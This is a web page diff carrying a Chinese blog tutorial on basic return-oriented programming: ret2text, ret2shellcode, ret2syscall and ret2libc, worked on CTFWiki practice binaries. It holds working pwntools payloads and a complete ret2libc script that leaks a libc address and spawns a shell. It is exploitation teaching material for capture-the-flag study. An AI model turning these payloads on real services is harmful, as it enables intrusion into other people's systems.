@@ -1,0 +1,790 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="梓曰">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="基本ROP Ret2Text ret2text 即控制程序执行程序本身已有的的代码 (即 .text 段中的代码) ，通常题目中存在有后门函数 对应例子： 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  int v4; &#x2F;&#x2F; [sp+1Ch] [bp-64h]@1  setvb">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Autumnal">
+<meta property="og:url" content="https://equinox-shame.github.io/2025/10/28/%E5%9F%BA%E6%9C%ACROP/index.html">
+<meta property="og:site_name" content="Autumnal">
+<meta property="og:description" content="基本ROP Ret2Text ret2text 即控制程序执行程序本身已有的的代码 (即 .text 段中的代码) ，通常题目中存在有后门函数 对应例子： 1234567891011int __cdecl main(int argc, const char **argv, const char **envp)&amp;#123;  int v4; &#x2F;&#x2F; [sp+1Ch] [bp-64h]@1  setvb">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2025/10/09/XCqWHSb9ALxlJh3.png">
+<meta property="og:image" content="https://img2022.cnblogs.com/blog/2706180/202201/2706180-20220127203642840-2033345372.png">
+<meta property="article:published_time" content="2025-10-28T08:26:34.506Z">
+<meta property="article:modified_time" content="2025-10-13T00:34:11.769Z">
+<meta property="article:author" content="梓曰">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2025/10/09/XCqWHSb9ALxlJh3.png">
+  
+  
+  
+  <title>Autumnal</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"equinox-shame.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"2aM6IUUWOeDGCZaDdRhrvLam-gzGzoHsz","app_key":"GQdXw2PjI9DScgw5QHVCZeYm","server_url":"https://2am6iuuw.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Autumnal Equinox</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text=""></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-10-28 16:26" pubdate>
+          2025年10月28日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.9k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none"></h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1>基本ROP</h1>
+<h2 id="Ret2Text">Ret2Text</h2>
+<p>ret2text 即控制程序执行程序本身已有的的代码 (即 <code>.text </code>段中的代码) ，通常题目中存在有后门函数</p>
+<p>对应例子：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">int</span> __cdecl <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [sp+1Ch] [bp-64h]@1</span><br><br>  <span class="hljs-built_in">setvbuf</span>(stdout, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">setvbuf</span>(_bss_start, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;There is something amazing here, do you know anything?&quot;</span>);<br>  <span class="hljs-built_in">gets</span>((<span class="hljs-keyword">char</span> *)&amp;v4);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Maybe I will tell you next time !&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>存在以下汇编：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:080486A7                 lea     eax, [esp+1Ch]<br>.text:080486AB                 mov     [esp], eax      ; s<br>.text:080486AE                 call    _gets<br></code></pre></td></tr></table></figure>
+<p>需要在<code>gdb</code>中将对应断点下在<code>gets (0x80486AE)</code>处，观察对应的<code>ebp</code>、<code>esp</code>计算对应填充长度，方法如下图：</p>
+<p><img src="https://s2.loli.net/2025/10/09/XCqWHSb9ALxlJh3.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>即对应的<code>Payload</code>为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">targetAddr = <span class="hljs-number">0xdeedbeef</span>		<span class="hljs-comment"># 程序中对应的 system 地址</span><br>payload = cyclic(<span class="hljs-number">0x6c</span> + <span class="hljs-number">4</span>) + p32(targetAddr)<br></code></pre></td></tr></table></figure>
+<h2 id="Ret2ShellCode">Ret2ShellCode</h2>
+<p>ret2shellcode，即控制程序执行 <code>shellcode</code> 代码，通常情况下需要自己写对应的 <code>shellcode</code>，对于拥有 NX 保护的时候通常不太考虑该方法</p>
+<p>相应的写入 shellcode 的地方需要有执行权限，<code>checksec</code> 带有 <code>rwx segment</code> 提示</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> checksec ret2shellcode</span><br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No PIE (0x8048000)<br>    RWX:      Has RWX segments<br></code></pre></td></tr></table></figure>
+<p>此时可以使用<code>readelf -S ret2shellcode</code>查看对应的<code>rwx</code>段地址信息(通常考虑 .bss 段)</p>
+<p>在 gdb 中使用<code>vmmap</code>查看各个段的权限信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs shell">➤  vmmap <br>Start      End        Offset     Perm Path<br>0x08048000 0x08049000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br>0x08049000 0x0804a000 0x00000000 r-x /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br>0x0804a000 0x0804b000 0x00001000 rwx /mnt/hgfs/Hack/CTF-Learn/pwn/stack/example/ret2shellcode/ret2shellcode<br>0xf7dfc000 0xf7fab000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fab000 0xf7fac000 0x001af000 --- /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fac000 0xf7fae000 0x001af000 r-x /lib/i386-linux-gnu/libc-2.23.so<br>0xf7fae000 0xf7faf000 0x001b1000 rwx /lib/i386-linux-gnu/libc-2.23.so<br>0xf7faf000 0xf7fb2000 0x00000000 rwx <br>0xf7fd3000 0xf7fd5000 0x00000000 rwx <br>0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]<br>0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]<br>0xf7fd9000 0xf7ffb000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffb000 0xf7ffc000 0x00000000 rwx <br>0xf7ffc000 0xf7ffd000 0x00022000 r-x /lib/i386-linux-gnu/ld-2.23.so<br>0xf7ffd000 0xf7ffe000 0x00023000 rwx /lib/i386-linux-gnu/ld-2.23.so<br>0xfffdd000 0xffffe000 0x00000000 rwx [stack]<br></code></pre></td></tr></table></figure>
+<p>对应的写入shellcode的 rwx 段信息为：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">0</span>x0804a000 <span class="hljs-number">0</span>x0804b000 <span class="hljs-number">0</span>x00001000 rwx <span class="hljs-regexp">/mnt/</span>hgfs<span class="hljs-regexp">/Hack/</span>CTF-Learn<span class="hljs-regexp">/pwn/</span>stack<span class="hljs-regexp">/example/</span>ret2shellcode/ret2shellcode<br></code></pre></td></tr></table></figure>
+<p>通过下面代码进行构造<code>shellcode</code>，进行写入</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure>
+<p>完整的<code>Payload</code>为：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())<br>buf2_addr = <span class="hljs-number">0x804a080</span>    <span class="hljs-comment"># RWX 段地址</span><br><br>payload = shellcode.ljust(<span class="hljs-number">112</span>, <span class="hljs-string">b&#x27;A&#x27;</span>) + p32(buf2_addr) <span class="hljs-comment"># 112 为溢出长度</span><br></code></pre></td></tr></table></figure>
+<h2 id="Ret2Syscall">Ret2Syscall</h2>
+<p>ret2syscall，即控制程序执行系统调用，获取 shell</p>
+<p>其核心在于尽可能的写入<code>/bin/sh</code>，而后在空间中执行<code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code>来获取<code>shell</code></p>
+<p>那么怎么写？此时需要一定的系统调用知识，需要我们在程序中找到对应的<code>gadget</code>来拼凑出一段<code>shellcode</code></p>
+<p>以 CTFWiki 上的 Ret2Syscall 题写入 <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> 为例，需要满足以下条件：</p>
+<ul>
+<li>系统调用号，即 eax 应该为 0xb 对应的是 execve</li>
+<li>第一个参数，即 ebx 应该指向 /bin/sh 的地址，其实执行 sh 的地址也可以。</li>
+<li>第二个参数，即 ecx 应该为 0</li>
+<li>第三个参数，即 edx 应该为 0</li>
+</ul>
+<p>对应的我们通过<code>ROPgadget</code>来分别寻找控制各个寄存器的片段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27; # 寻找控制 eax 片段<br>ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;<br>ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; <br>ROPgadget --binary rop  --only &#x27;int 80&#x27;<br></code></pre></td></tr></table></figure>
+<p>此时我们可以分别获取对应的地址，此时我们控制垃圾数据进行溢出，设置<code>pop_reg_ret</code>以及对应的参数，进行触发 <code>int 80</code> 的系统中断调用</p>
+<p>Payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">pop_eax_ret = <span class="hljs-number">0x080bb196</span><br>pop_edx_ecx_ebx_ret = <span class="hljs-number">0x0806eb90</span><br>int_0x80 = <span class="hljs-number">0x08049421</span><br>binsh = <span class="hljs-number">0x80be408</span><br>payload = flat(<br>    [<span class="hljs-string">&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, pop_eax_ret, <span class="hljs-number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, binsh, int_0x80]<br>    )<br></code></pre></td></tr></table></figure>
+<p>当然寻找 gadget 不仅限制于此，可以是以下Payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=p32(pop_ecx_addr)+p32(bss_addr)+p32(pop_[ecx]_addr)+<span class="hljs-string">&#x27;/bin&#x27;</span><br>payload+=p32(pop_ecx_addr)+p32(bss_addr+<span class="hljs-number">4</span>)+p32(pop_[ecx]_addr)+<span class="hljs-string">&#x27;/sh\x00&#x27;</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>需要程序具有 <code>pop [ecx]</code> 这样的片段</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary xxx | grep &#x27;pop dword ptr \[ecx\]&#x27;<br></code></pre></td></tr></table></figure>
+<p>当然不一定非得是 ecx 可以是其他寄存器</p>
+</blockquote>
+<p>逻辑如图所示：</p>
+<p><img src="https://img2022.cnblogs.com/blog/2706180/202201/2706180-20220127203642840-2033345372.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>TIPs: 程序是静态链接的情况下，可以考虑使用ROPgadget自动生成shellcode</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ROPgadget --binary xxx --ropchain<br></code></pre></td></tr></table></figure>
+<h2 id="Ret2Libc">Ret2Libc</h2>
+<p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要 <code>system</code> 函数的地址以及 <code>/bin/sh</code> 的地址</p>
+<p>以CTFWiki 例1 为例，其在程序中存在<code>system</code>以及<code>/bin/sh</code>的地址，所以可以直接利用，对应Payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">binsh_addr = <span class="hljs-number">0x8048720</span><br>system_plt = <span class="hljs-number">0x08048460</span><br>payload = flat([<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, system_plt, <span class="hljs-string">b&#x27;b&#x27;</span> * <span class="hljs-number">4</span>, binsh_addr])<br><span class="hljs-comment"># 其中 b&#x27;b&#x27; * 4 为 system 的返回地址，当我们拿到 shell 后其实并不关心其返回地址 </span><br></code></pre></td></tr></table></figure>
+<p>当程序中并不存在 <code>/bin/sh</code> 时，便是对应 例2 的情况，但是程序中拥有 <code>gets</code> 函数，可以通过溢出后将对应的 <code>gets</code> 设置为跳转地址，然后写入到 <code>.bss</code> 中，Payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">gets_plt = <span class="hljs-number">0x08048460</span><br>system_plt = <span class="hljs-number">0x08048490</span><br>pop_ebx = <span class="hljs-number">0x0804843d</span><br>buf2 = <span class="hljs-number">0x804a080</span><br>payload = flat(<br>    [<span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">112</span>, gets_plt, pop_ebx, buf2, system_plt, <span class="hljs-number">0xdeadbeef</span>, buf2])<br><br><span class="hljs-comment"># io.sendline(payload)</span><br><span class="hljs-comment"># io.sendline(b&#x27;/bin/sh&#x27;)</span><br></code></pre></td></tr></table></figure>
+<p>但是如果程序没有 <code>system</code> 也没有 <code>/bin/sh</code> 时，对应的题目便是 例3</p>
+<p>对于此题我们使用 <code>checksec</code> 可以看到有 NX 保护(禁止栈执行代码)</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">[*] &#x27;/home/zera/Desktop/ret2libc3&#x27;<br>    Arch:       i386-32-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX enabled<br>    PIE:        No PIE (0x8048000)<br>    Stripped:   No<br>    Debuginfo:  Yes<br></code></pre></td></tr></table></figure>
+<p>对于此题需要我们找到对应程序的 <code>libc</code> 版本信息，而后 在 <code>libc</code> 中找到对应 <code>system</code>、 <code>/bin/sh</code> 的地址，对于程序而言，就算其有 ASLR(随机地址) 保护但是不会改变其低 12 位</p>
+<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。同时，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址，对此我们考虑泄露 <code>__libc_start_main</code> 的地址，因为其是程序最开始被执行的地方，我们在程序中找到对应的 <code>puts</code> 地址将其进行打印后，利用 <code>LibcSearcher</code> 找到对应 <code>libc</code> 版本，即可定位对应 <code>libc_base</code> 从而拿到我们想要的地址信息</p>
+<p>总体而言，需要我们完成以下过程：</p>
+<ul>
+<li>泄露 <code>__libc_start_main</code> 地址</li>
+<li>获取 libc 版本</li>
+<li>获取 system 地址与 <code>/bin/sh</code> 的地址</li>
+<li>再次执行源程序</li>
+<li>触发栈溢出执行 <code>system('/bin/sh')</code></li>
+</ul>
+<p>对应的Payload如下所示：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>sh = process(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>ret2libc3 = ELF(<span class="hljs-string">&#x27;./ret2libc3&#x27;</span>)<br><br>puts_plt = ret2libc3.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>libc_start_main_got = ret2libc3.got[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>main = ret2libc3.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;leak libc_start_main_got addr and return to main again&quot;</span>)<br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">112</span>, puts_plt, main, libc_start_main_got]) <span class="hljs-comment"># 泄露对应 __libc_start_main 的地址信息</span><br>sh.sendlineafter(<span class="hljs-string">b&#x27;Can you find it !?&#x27;</span>, payload)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get the related addr&quot;</span>)<br>libc_start_main_addr = u32(sh.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>libc = LibcSearcher(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>, libc_start_main_addr) <span class="hljs-comment"># 寻找 libc 版本</span><br>libcbase = libc_start_main_addr - libc.dump(<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>) <span class="hljs-comment"># 获取到偏移后计算基址</span><br>system_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>binsh_addr = libcbase + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;get shell&quot;</span>)<br>payload = flat([<span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">104</span>, system_addr, <span class="hljs-number">0xdeadbeef</span>, binsh_addr]) <br>sh.sendline(payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div></div>
+      <div>https://equinox-shame.github.io/2025/10/28/基本ROP/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>梓曰</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年10月28日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/10/28/%E4%B8%AD%E7%BA%A7ROP/" title="">
+                        <span class="hidden-mobile"></span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"2aM6IUUWOeDGCZaDdRhrvLam-gzGzoHsz","appKey":"GQdXw2PjI9DScgw5QHVCZeYm","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":true,"serverURLs":"","emojiCDN":"//i0.hdslb.com/bfs/emote/","emojiMaps":{"脱单doge":"bf7e00ecab02171f8461ee8cf439c73db9797748.png","热":"4e58a2a6f5f1580ac33df2d2cf7ecad7d9ab3635.png","微笑":"685612eadc33f6bc233776c6241813385844f182.png","口罩":"3ad2f66b151496d2a5fb0a8ea75f32265d778dd3.png","doge":"3087d273a78ccaff4bb1e9972e2ba2a7583c9f11.png","妙啊":"b4cb77159d58614a9b787b91b1cd22a81f383535.png","OK":"4683fd9ffc925fa6423110979d7dcac5eda297f4.png","星星眼":"63c9d1a31c0da745b61cdb35e0ecb28635675db2.png","辣眼睛":"35d62c496d1e4ea9e091243fa812866f5fecc101.png","吃瓜":"4191ce3c44c2b3df8fd97c33f85d3ab15f4f3c84.png","滑稽":"d15121545a99ac46774f1f4465b895fe2d1411c3.png","呲牙":"b5a5898491944a4268360f2e7a84623149672eb6.png","打call":"431432c43da3ee5aab5b0e4f8931953e649e9975.png","歪嘴":"4384050fbab0586259acdd170b510fe262f08a17.png","调皮":"8290b7308325e3179d2154327c85640af1528617.png","翻白眼":"eba54707c7168925b18f6f8b1f48d532fe08c2b1.png","灵魂出窍":"43d3db7d97343c01b47e22cfabeca84b4251f35a.png","再见":"fc510306bae26c9a